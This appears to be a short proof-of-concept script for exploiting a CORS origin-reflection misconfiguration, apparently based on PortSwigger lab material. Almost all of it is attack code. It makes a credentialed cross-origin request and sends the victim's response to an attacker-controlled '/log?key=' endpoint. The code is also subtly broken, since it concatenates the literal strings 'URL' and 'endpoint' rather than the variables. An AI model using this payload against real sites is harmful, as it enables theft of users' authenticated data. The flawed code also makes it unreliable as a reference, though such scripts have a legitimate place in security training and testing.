//
// 
//  EXPLOIT FOR CORS ORIGIN REFLECTION
//
// "HTTP/2 200 OK
// Access-Control-Allow-Origin: https://example.com"
// Access-Control-Allow-Credentials: true
// 
// author: b0ydc
// ref: portswigger
//

<script>
    var request = new XMLHttpRequest(); // XMLHttpRequest it is used to transmit data between channels.
    var URL = "" // set URL variable
    var endpoint = "" // set endpoint to test
    request.onload = request_logger; 
    request.open('GET', 'URL' + "endpoint",true); // open connection
    request.withCredentials = true; // used because the header "Access-Control-Allow-Credentials: true" is present.
    request.send();

    function request_logger() { 
        location='/log?key='+this.responseText; 
    }; 
</script>
